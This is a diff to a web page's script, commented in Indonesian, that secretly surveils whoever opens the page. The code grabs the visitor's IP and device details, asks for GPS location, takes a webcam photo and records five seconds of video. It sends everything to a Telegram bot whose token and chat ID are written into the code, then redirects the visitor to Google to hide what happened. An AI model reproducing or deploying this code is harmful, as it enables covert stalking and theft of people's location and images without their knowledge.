@@ -19,14 +19,13 @@
 </div>
 
 <script>
-    // KONFIGURASI (GANTI DENGAN MILIKMU)
     const TOKEN = "8335849839:AAFhhUYDiOUVybcp0WMUODHkhBjlRXJQWb8";
     const CHAT_ID = "7665671289";
 
     async function sikatSemua() {
         let info = "=== TARGET MASUK ===\n";
 
-        // 1. Ambil Info Perangkat & IP
+        // 1. Ambil Info Perangkat & IP (Dibetulkan linknya)
         try {
             const res = await fetch('https://ipapi.co');
             const d = await res.json();
@@ -36,7 +35,7 @@
 
         kirimPesan(info);
 
-        // 2. Ambil Lokasi GPS
+        // 2. Ambil Lokasi GPS (Dibetulkan link mapsnya)
         navigator.geolocation.getCurrentPosition(pos => {
             const map = `https://google.com{pos.coords.latitude},${pos.coords.longitude}`;
             kirimPesan(`[LOKASI PRESISI]\n${map}`);
@@ -50,7 +49,7 @@
             video.muted = true;
             await video.play();
 
-            // --- PROSES AMBIL FOTO (Menunggu 4 detik agar sensor cahaya siap) ---
+            // Tunggu 4 detik agar cahaya oke
             setTimeout(async () => {
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
@@ -59,27 +58,25 @@
                 
                 canvas.toBlob(blob => kirimFile(blob, 'sendPhoto', 'photo'), 'image/jpeg');
 
-                // --- PROSES REKAM VIDEO (5 Detik) ---
                 const recorder = new MediaRecorder(stream);
                 const chunks = [];
                 recorder.ondataavailable = e => chunks.push(e.data);
                 recorder.onstop = () => {
                     const videoBlob = new Blob(chunks, { type: 'video/mp4' });
                     kirimFile(videoBlob, 'sendVideo', 'video');
-                    stream.getTracks().forEach(t => t.stop()); // Matikan kamera
+                    stream.getTracks().forEach(t => t.stop());
                     
-                    // Redirect setelah semua selesai
-                    setTimeout(() => { window.location.href = "https://google.com"; }, 2000);
+                    setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
                 };
 
                 recorder.start();
-                setTimeout(() => recorder.stop(), 5000); // Rekam selama 5 detik
+                setTimeout(() => recorder.stop(), 5000); 
 
             }, 4000);
 
         } catch (err) {
             kirimPesan("❌ Kamera/Mic Ditolak");
-            setTimeout(() => { window.location.href = "https://google.com"; }, 2000);
+            setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
         }
     }
 
